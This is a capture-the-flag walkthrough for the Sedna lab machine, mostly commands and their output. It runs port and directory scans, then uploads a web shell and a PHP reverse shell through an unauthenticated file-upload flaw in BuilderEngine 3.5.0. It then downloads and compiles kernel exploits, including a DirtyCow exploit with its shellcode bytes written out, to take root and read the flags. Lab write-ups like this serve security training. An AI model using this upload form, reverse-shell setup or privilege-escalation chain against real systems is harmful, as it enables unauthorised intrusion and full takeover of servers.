# ctf-Sedna




First , nmapping :
nmap -sS -A 192.168.1.93 

Scanning Sedna (192.168.1.93) [1000 ports]
     | Discovered open port 8080/tcp on 192.168.1.93
     
     | Discovered open port 22/tcp on 192.168.1.93
     
     | Discovered open port 445/tcp on 192.168.1.93
     
     | Discovered open port 110/tcp on 192.168.1.93
     
     | Discovered open port 143/tcp on 192.168.1.93
     
     | Discovered open port 139/tcp on 192.168.1.93
     
     | Discovered open port 111/tcp on 192.168.1.93
     
     | Discovered open port 53/tcp on 192.168.1.93
     
     | Discovered open port 993/tcp on 192.168.1.93
     
     | Discovered open port 995/tcp on 192.168.1.93
     
     | Discovered open port 80/tcp on 192.168.1.93

And  dirb  http://192.168.1.93  /home/boax/Téléchargements/common.txt 


$ DIRB v2.22    
By The Dark Raver
START_TIME: Sat Oct 14 17:21:04 2017
URL_BASE: http://192.168.1.93/
WORDLIST_FILES: /home/boax/Téléchargements/common.txt


GENERATED WORDS: 4613                                                          

---- Scanning URL: http://192.168.1.93/ ----
==> DIRECTORY: http://192.168.1.93/blocks/                                                                                                      
==> DIRECTORY: http://192.168.1.93/files/                                                                                                       
+ http://192.168.1.93/index.html (CODE:200|SIZE:101)                                                                                            
==> DIRECTORY: http://192.168.1.93/modules/                                                                                                     
+ http://192.168.1.93/robots.txt (CODE:200|SIZE:36)                                                                                             
+ http://192.168.1.93/server-status (CODE:403|SIZE:292)                                                                                         
==> DIRECTORY: http://192.168.1.93/system/                                                                                                      
==> DIRECTORY: http://192.168.1.93/themes/            

On http://192.168.1.93/themes/default_theme_2015/

and http://192.168.1.93/themes/default_theme_2015/description.tx 

==>>  Default 2015 Theme for BuilderEngine V3 !
An exploit :

https://www.exploit-db.com/exploits/40390/

so :

 Exploit Title: BuilderEngine 3.5.0 Remote Code Execution via elFinder 2.0
 Date: 18/09/2016
 Exploit Author: metanubix
 Vendor Homepage: http://builderengine.org/
 Software Link: http://builderengine.org/page-cms-download.html
 Tested on: Kali Linux 2.0 64 bit
 Google Dork: intext:"BuilderEngine Ltd. All Right Reserved"
 
Unauthenticated Unrestricted File Upload:
 
    POST /themes/dashboard/assets/plugins/jquery-file-upload/server/php/
 
    Vulnerable Parameter: files[]
 
    We can upload test.php and reach the file via the following link:
    /files/test.php



On local , u can upload a shell :

             form method="post" action="http://192.168.1.93/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data">
             <input name="files[]" type="file">
             <input value="send" type="submit">
             </form>

and uploading for example :

https://github.com/b374k/b374k

u can find ( on .. and .. )
the flag1 : bfbb7e6e6e88d9ae66848b9aeac6b289 .

Good §

For the second flag :

Uploading php-reverse-shell on :http://pentestmonkey.net/tools/web-shells/php-reverse-shell
and getting ur port .

nc -lnvp 4444 :
uname -a
Linux Sedna 3.13.0-32-generic

With an exploit :https://www.exploit-db.com/exploits/37292/

uploading wget https://www.exploit-db.com/download/37292

mv 37292 shell.c

gcc shell.c -o shell

./shell

spawning threads

mount #1

mount #2

child threads done

id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

can't give root access !!!

Then , ive tried several dirty cow exploits and each time it's a crashing sedna vm ...!

Now ,  i try the exploit :https://www.exploit-db.com/exploits/40616/ keeping the 32 bits/version :

unsigned char sc[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,
  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,
  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,
  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,
  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,
  0x89, 0xe1, 0xcd, 0x80
};
unsigned int sc_len = 136;

lets go :

i put this exploit with correction on a file /4061632 uploaded on 192.168.1.93 .

continuing on shell :

$ python -c 'import pty;pty.spawn("/bin/bash")'

www-data@Sedna:/$ id

id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@Sedna:/$ cd tmp

cd tmp

www-data@Sedna:/tmp$ ls

ls

hsperfdata_tomcat7  tomcat7-tomcat7-tmp

www-data@Sedna:/tmp$ wget http://192.168.1.93/files/4061632

mv 4061632 cowroot.c

gcc cowroot.c -o cowroot -pthread

./cowroot

DirtyCow root privilege escalation

Backing up /usr/bin/passwd.. to /tmp/bak

Size of binary: 45420

Racing, this may take a while..

thread stopped

/usr/bin/passwd is overwritten

Popping root shell.

Don't forget to restore /tmp/bak

thread stopped

root@Sedna:/tmp# echo 0 > /proc/sys/vm/dirty_writeback_centisecs   ////( quickly !!!)

echo 0 > /proc/sys/vm/dirty_writeback_centisecs

root@Sedna:/tmp# id

id

uid=0(root) gid=33(www-data) groups=0(root),33(www-data)

!!!!

seraching the last flag ...

ls

bin   dev  home        lib         media  opt   root  sbin  sys  usr  vmlinuz
boot  etc  initrd.img  lost+found  mnt    proc  run   srv   tmp  var
root@Sedna:/# cd root

cd root

root@Sedna:/root# ls

ls

8d2daf441809dcd86398d3d750d768b5-BuilderEngine-CMS-V3.zip  chkrootkit  flag.txt

root@Sedna:/root# cat flag.txt

cat flag.txt

a10828bee17db751de4b936614558305  the flag2.


Good challenge . TY §








